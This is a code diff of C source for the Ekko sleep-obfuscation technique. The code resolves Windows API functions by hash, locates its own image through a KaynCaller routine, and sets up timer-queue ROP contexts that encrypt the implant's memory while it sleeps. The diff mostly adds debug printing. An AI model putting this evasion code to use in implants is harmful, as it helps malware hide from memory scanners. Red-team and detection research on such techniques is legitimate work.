@@ -153,7 +153,7 @@ SEC( text, B ) VOID Entry( VOID )
     
 } 
 
-SEC( text, B ) VOID Ekko ( DWORD SleepTime)
+SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 {
 
     #define NT_SUCCESS(Status) ( (NTSTATUS)(Status) >= 0 )
@@ -184,6 +184,8 @@ SEC( text, B ) VOID Ekko ( DWORD SleepTime)
     Instance.Win32.SetEvent = LdrFunction (Instance.Modules.Kernel32, 0x9d7ff713);
     Instance.Win32.DeleteTimerQueue = LdrFunction (Instance.Modules.Kernel32, 0x1b141ede);
 
+    Instance.Win32.printf( "[INFO] Symbols and libraries are loaded!\n");
+
     CONTEXT CtxThread   = { 0 };
     CONTEXT RopProtRW   = { 0 };
     CONTEXT RopMemEnc   = { 0 };
@@ -201,7 +203,7 @@ SEC( text, B ) VOID Ekko ( DWORD SleepTime)
 
     // Can be randomly generated
     CHAR    KeyBuf[ 16 ]= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
-    UNICODE_STRING poop = { 0 };
+
     USTRING Key = { 0 };
     USTRING Img  = { 0 };
 
@@ -211,15 +213,13 @@ SEC( text, B ) VOID Ekko ( DWORD SleepTime)
     hEvent      = Instance.Win32.CreateEventW( 0, 0, 0, 0 );
     hTimerQueue = Instance.Win32.CreateTimerQueue();
 
-#ifdef ISEXE
-    ImageBase   = Instance.Win32.GetModuleHandleA( NULL );
+#ifdef ISEXE or ISDLL
+    ImageBase   = KaynCaller();
+    Instance.Win32.printf( "[INFO] KaynCAller was called\n" );
     ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
 #endif
-
-#ifdef ISDLL
-    ImageBase   = Instance.Win32.GetModuleHandleA( NULL );
-    ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
-#endif
+    Instance.Win32.printf( "[INFO] ImageBase is 0x%llx\n",ImageBase );
+    Instance.Win32.printf( "[INFO] ImageSize is 0x%llx\n", ImageSize );
 
     Key.Buffer  = KeyBuf;
     Key.Length  = Key.MaximumLength = 16;
@@ -227,11 +227,12 @@ SEC( text, B ) VOID Ekko ( DWORD SleepTime)
     Img.Buffer  = ImageBase;
     Img.Length  = Img.MaximumLength = ImageSize;
     
+    
     if (  Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
     {
         
         Instance.Win32.WaitForSingleObject( hEvent, 0x50 );
-        
+
         Instance.Win32.memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
         Instance.Win32.memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
         Instance.Win32.memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
